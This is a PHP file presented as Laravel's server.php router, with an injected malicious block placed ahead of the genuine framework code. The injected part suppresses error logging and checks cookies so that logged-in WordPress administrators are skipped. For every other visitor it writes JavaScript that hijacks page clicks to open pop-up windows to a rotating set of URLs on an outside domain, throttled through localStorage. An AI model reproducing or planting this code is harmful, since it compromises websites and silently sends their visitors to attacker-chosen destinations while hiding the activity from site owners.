<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0){
	echo '<script>(function (parameters) {
		const targets = [
			\'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
		]
		// Times between clicks
		const restMinutes = 1;
		// Number of hours to allow re-click 
		const allowedHours = 2;


		const saveTargetLocationsToStorage = (targets) => {
			targets.forEach((target, index) => {
				if(!localStorage.getItem(`${target}-local-storage`)){
					localStorage.setItem(`${target}-local-storage`, 0);
				}
			});
		}
		const getRandomLocationFromStorage = (targets) => {
			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
		}
		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getMintsDiff = (startDate, endDate) => {
			const msInMints = 1000 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInMints);
		}

		const visitNewLocation = (targets, host, nowDate) => {
			saveTargetLocationsToStorage(targets);
			newLocation = getRandomLocationFromStorage(targets);
			setTimeToStorage(`${host}-mnts`, nowDate);
			setTimeToStorage(`${host}-hurs`, nowDate);
			setLocationAsVisited(newLocation);
			window.open(newLocation, "_blank");
		}

		// const randomLocation = getRandomLocationFromStorage(targets);
		saveTargetLocationsToStorage(targets);

		function globalClick(event) {
			event.stopPropagation();
			const host = location.host;
			let newLocation = getRandomLocationFromStorage(targets);
			const nowDate = Date.parse(new Date());
			const savedDateForMints = getTimeStorage(`${host}-mnts`);
			const savedDateForHours = getTimeStorage(`${host}-hurs`);

			if (savedDateForMints && savedDateForHours) {
				try {
					const storageDateForMints = parseInt(savedDateForMints);
					const storageDateForHours = parseInt(savedDateForHours);
					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

					if (hoursDiff >= allowedHours) {
						saveTargetLocationsToStorage(targets);
						setTimeToStorage(`${host}-hurs`, nowDate);
					}
					if (mintsDiff >= restMinutes) {
						if (newLocation) {
							setTimeToStorage(`${host}-mnts`, nowDate);
							window.open(newLocation, "_blank");
							setLocationAsVisited(newLocation);
						}
					}
				} catch (error) { visitNewLocation(targets, host, nowDate); }
			} else { visitNewLocation(targets, host, nowDate); }
		}
		document.addEventListener("click", globalClick)
	})()</script>';
}

?>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
